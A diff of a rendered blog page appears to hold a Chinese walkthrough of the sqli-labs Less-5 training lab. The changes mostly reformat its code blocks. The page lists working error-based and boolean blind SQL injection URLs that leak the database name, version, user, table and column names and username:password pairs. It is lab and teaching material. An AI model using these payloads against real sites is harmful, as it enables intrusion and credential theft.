@@ -479,7 +479,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.6k
+                    3.8k
                 </div>
                 
 
@@ -496,6 +496,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -506,15 +509,15 @@
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202202635835.png" alt="image-20220202202635835"></p>
 <p>这时候才发现1-4关的注入方式已经在5关用不了了。</p>
 <p>但这里还是可以判断出字段数的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; order by 3--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; order by 3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; order by 4--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; order by 4--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>根据回显，正确时就会返回You are in……….，错误时返回空。</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202203008094.png" alt="image-20220202203008094"></p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202202947666.png" alt="image-20220202202947666"></p>
 <h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>开始注入以下语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; union select 1,count(*), concat((select database()),floor(rand()*2)) as  a from information_schema.schemata group by a --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select database()),floor(rand()*2)) as  a from information_schema.schemata group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>第一次点击，回显正常页面</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202204824647.png" alt="image-20220202204824647"></p>
@@ -531,118 +534,119 @@
 <p>　 <strong>因为 rand 函数的特殊性（如果使用rand()的话，该值会被计算多次）。</strong><br>　 <strong>在这里的意思就是，group by 进行分组时，<code>floor(rand(0)*2)</code>执行一次（查看分组是否存在），如果虚拟表中不在在该分组，那么在插入新分组的时候 <code>floor(rand(0)*2)</code> 就又计算了一次。</strong></p>
 <p>　　<strong>当我们使用<code>floor(rand(0)*2)</code>产生0和1两个随机数后，当在<code>group by</code> 对其进行分组的时候，首先遇到第一个值 0 ，发现 0 不存在，于是需要插入分组，就在这时，<code>floor(rand(0)\*2)</code>再次被触发，生成第二个值 1 ，因此最终插入虚拟表的也就是第二个值 1 ；然后遇到第三个值 1 ，因为已经存在分组 1 了，就直接计数加1（这时1的计数变为2）;遇到第四个值 0 的时候，发现 0 不存在，于是又需要插入新分组，然后<code>floor(rand(0)*2)</code>又被触发，生成第五个值 1 ，因此这时还是往虚拟表里插入分组 1 ，但是，分组 1 已经存在了！所以报错！</strong></p>
 <h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>接下来爆版本号：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; union select 1,count(*), concat((select version()),floor(rand()*2)) as  a from information_schema.schemata group by a --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select version()),floor(rand()*2)) as  a from information_schema.schemata group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202210651585.png" alt="image-20220202210651585"></p>
 <h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>爆数据库用户名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; union select 1,count(*), concat((select user()),floor(rand()*2)) as  a from information_schema.schemata group by a --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select user()),floor(rand()*2)) as  a from information_schema.schemata group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202210909030.png" alt="image-20220202210909030"></p>
 <h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>这里爆表名的时候出现了错误：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Subquery returns more than 1 row  子查询返回数据超过1行</span><br><span class="line">其实就是子查询返回数据时只能返回一条数据，但由于这里注入返回的结果超过了一行导致报错</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Subquery returns more than 1 row  子查询返回数据超过1行
+其实就是子查询返回数据时只能返回一条数据，但由于这里注入返回的结果超过了一行导致报错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202211656117.png" alt="image-20220202211656117"></p>
 <p>注到这里，看了一下解决Subquery returns more than 1 row的办法，用limit字段限制多余查询</p>
 <p><strong>limit语法：limit M,N 是从第M+1条数据开始查询，查询出N条数据。</strong></p>
 <p>注入语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; union select 1,count(*), concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这里一定要在子查询后面添加<strong>limit 0,1</strong>,如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1 ),floor(rand()*2))</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1 ),floor(rand()*2))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202212813330.png" alt="image-20220202212813330"></p>
 <h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>爆出所有表名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; union select 1,count(*), concat((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202213030869.png" alt="image-20220202213030869"></p>
 <h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>爆所有字段：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; union select 1,count(*), concat((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1 ),floor(rand()*2)) as  a from information_schema.columns  group by a --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1 ),floor(rand()*2)) as  a from information_schema.columns  group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202213249676.png" alt="image-20220202213249676"></p>
 <h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>这里要爆用户名的时候同样用了爆列名时候的group_concat()函数，但试了很多次，没有回显用户名数据，只有You are in……….</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; union select 1,count(*), concat((select group_concat(username) from users limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select group_concat(username) from users limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202214749674.png" alt="image-20220202214749674"></p>
 <p>以至于改成下面的注入语句：</p>
 <p>不过这里只能通过控制<strong>limit字段</strong>来爆出用户名和密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; union select 1,count(*), concat((select concat(username, &#x27;:&#x27;,password,&#x27;;&#x27;) from users limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select concat(username, &#39;:&#39;,password,&#39;;&#39;) from users limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202214631827.png" alt="image-20220202214631827"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; union select 1,count(*), concat((select concat(username,&#x27;:&#x27;,password,&#x27;;&#x27;) from users limit 1,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select concat(username,&#39;:&#39;,password,&#39;;&#39;) from users limit 1,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>以此类推。</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202215303667.png" alt="image-20220202215303667"></p>
 <hr>
 <h2 id="0x01（无回显的布尔）"><a href="#0x01（无回显的布尔）" class="headerlink" title="0x01（无回显的布尔）"></a>0x01（无回显的布尔）</h2><p>探测数据库版本是否&gt;=5，回显正常，数据库版本在5.0以上</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and left(version(),1)&gt;=5 --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(version(),1)&gt;&#x3D;5 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202222007795.png" alt="image-20220202222007795"></p>
 <h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>利用length()函数探测数据库长度：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and length(database())=10 --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;10 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>页面错误，表示数据库长度不是10。</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202222342805.png" alt="image-20220202222342805"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;8 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>此时回显正常，数据库长度为8。</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202222452003.png" alt="image-20220202222452003"></p>
 <h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h2><p>猜测数据库名第一位：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and left(database(),1)&gt;&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),1)&gt;&#39;a&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202223235772.png" alt="image-20220202223235772"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and left(database(),1)&gt;&#x27;s&#x27;--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202223307482.png" alt="image-20220202223307482"></p>
 <p>若数据库第一位大于a返回正常，如图1；若数据库第一位不大于s则返回异常，通常这样的情况需要从a~z每一个去判断，若回显异常，则就是数据库第一位字符。</p>
 <p>得知第一位是s，猜第二位，这里判断前两位是否大于sa即可：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and left(database(),2)&gt;&#x27;sa&#x27;--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),2)&gt;&#39;sa&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这里回显正常，表示第二位大于a</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202223948285.png" alt="image-20220202223948285"></p>
 <p>从a开始一个一个去试，发现到e的时候回显异常，证明第二位字符是e。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and left(database(),2)&gt;&#x27;se&#x27;--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),2)&gt;&#39;se&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202224036469.png" alt="image-20220202224036469"></p>
 <p>剩下的字符根据得出的数据库的长度依次去猜每一位字符（这里可以写一个脚本去跑）</p>
 <h2 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h2><p>利用ascii()和substr()函数猜测表名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这里第一个表的第一个字符的ascii码&gt;100，回显正确</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202230834521.png" alt="image-20220202230834521"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101 --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;101 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>大于101时回显错误，根据acsii码表可知，101是e，所以第一张表的第一个字符是e。</p>
 <p>（在实战当中，应该从a=97开始猜测，一个一个去试）</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202231015624.png" alt="image-20220202231015624"></p>
 <p>第二个字符通过substr(**,2,1)进行猜测，剩下的字符以此类推。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108 --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),2,1))&gt;108 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202231524818.png" alt="image-20220202231524818"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;109 --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),2,1))&gt;109 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202231604072.png" alt="image-20220202231604072"></p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202230525691.png" alt="image-20220202230525691"></p>
 <p><strong>获取剩下的表：</strong></p>
 <p>上述的语句中使用的 limit 0,1； 意思就是从第 0 个开始，获取第一个。那要获取第二个就是limit 1,1</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;113 --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1,1))&gt;113 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>页面返回正常，表示第二张表的第一个字符&gt;113</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202232002600.png" alt="image-20220202232002600"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;114 --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1,1))&gt;114 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>不大于114，证明第二张表的第一个字符是r，以后的过程就是不断的重复上面的。</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202232109005.png" alt="image-20220202232109005"></p>
 <h2 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h2><p>利用 regexp 获取users表中的列：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and 1=(select 1 from information_schema.columns where table_name=&#x27;users&#x27; and column_name regexp &#x27;^u[a-z]&#x27; limit 0,1) --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^u[a-z]&#39; limit 0,1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>页面回显正常，判断出users表中有u开头的字段</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202234036314.png" alt="image-20220202234036314"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and 1=(select 1 from information_schema.columns where table_name=&#x27;users&#x27; and column_name regexp &#x27;^w[a-z]&#x27; limit 0,1) --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^w[a-z]&#39; limit 0,1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>若无字符开头的字段，回显异常，如图：</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202234258789.png" alt="image-20220202234258789"></p>
 <p>依次进行正表达式猜列的字段名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and 1=(select 1 from information_schema.columns where table_name=&#x27;users&#x27; and column_name regexp &#x27;^username&#x27; limit 0,1) --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^username&#39; limit 0,1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>猜测出字段名后要判断是否正确，直接判断 table_name = ‘username’即可 。 </p>
 <p>password字段同理。</p>
@@ -656,11 +660,11 @@
 <p>cast(username as char)：表示将username表达式转换为char类型。</p>
 <p>ORD()：返回第一个字符的ASCII码。</p>
 <p>ORDER BY 关键字默认按照升序对记录进行排序。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))=68--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&#x3D;68--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>结果返回正常，证明username字段中第一个用户名的第一个字符是D；接下来重复造轮子即可。</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203001328114.png" alt="image-20220203001328114"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))=68 </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&#x3D;68 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>代码解析：先从users表中查询到username字段，然后执行cast(username as char)，将字段username转换为char类型，如果没有username字段，ifnull()函数将返回0x20（这里如果返回0x20已经没什么意义了，不需要继续了），按照id升序的方式排列，之后执行mid()函数，将查询到的用户名从第1位开始截取长度为1的字符，然后在执行ord()函数，将截取的字符转换为acsii码与68进行比较。<strong>此处的0x20是十六进制的ascii，表示空格</strong></p>
 <hr>
@@ -670,42 +674,42 @@
 <p>new_value：替换查找到的数据</p>
